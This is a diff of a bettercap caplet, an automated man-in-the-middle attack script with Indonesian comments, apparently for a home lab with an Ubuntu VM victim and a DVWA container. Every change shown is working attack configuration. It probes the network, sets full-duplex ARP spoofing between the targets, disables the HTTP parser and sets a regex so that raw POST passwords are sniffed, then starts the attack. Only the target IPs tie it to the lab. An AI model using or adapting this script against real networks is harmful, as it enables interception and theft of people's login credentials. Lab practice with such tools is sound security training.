@@ -1,29 +1,34 @@
 # ============================================================
-# bettercap.caplet — automated MITM attack script
+# bettercap.caplet — Automated MITM Attack Script
 #
 # Usage (inside bettercap container):
-#   sudo bettercap -iface eth0 -caplet /root/bettercap.caplet
+#   bettercap -iface eth0 -caplet /app/bettercap.caplet
 #
 # Targets:
-#   192.168.56.101  — Ubuntu VM (victim)
-#   192.168.56.102  — Metasploitable VM
+#   192.168.56.101  — Ubuntu VM (Victim)
+#   192.168.56.20   — DVWA Container (Target Server)
 # ============================================================
 
-# --- ARP Spoof Configuration ---
+# --- 1. Discovery (Pemanasan Jaringan) ---
+# Memaksa spoofer untuk menemukan MAC Address target yang bersembunyi
+net.probe on
+sleep 5
+net.probe off
+
+# --- 2. ARP Spoof Configuration ---
+# Menjebak lalu lintas bolak-balik antara Ubuntu dan DVWA
 set arp.spoof.fullduplex true
 set arp.spoof.internal   true
-set arp.spoof.targets    192.168.56.101,192.168.56.102
+set arp.spoof.targets    192.168.56.101,192.168.56.20
 
-# --- Sniffer Configuration ---
+# --- 3. Sniffer Configuration (Deep Capture) ---
+# Mematikan HTTP parser bawaan dan menggunakan Regex agar payload 
+# form POST (username & password) tertangkap mentah tanpa terpotong
+set net.sniff.filter     ""
+set net.sniff.http       false
 set net.sniff.verbose    true
-set net.sniff.filter     port 80
+set net.sniff.regexp     .*password=.*
 
-# --- Discovery ---
-net.probe on
-
-# Wait for discovery to populate host table
-sleep 5
-
-# --- Start Attack ---
+# --- 4. Start Attack ---
 arp.spoof on
 net.sniff on
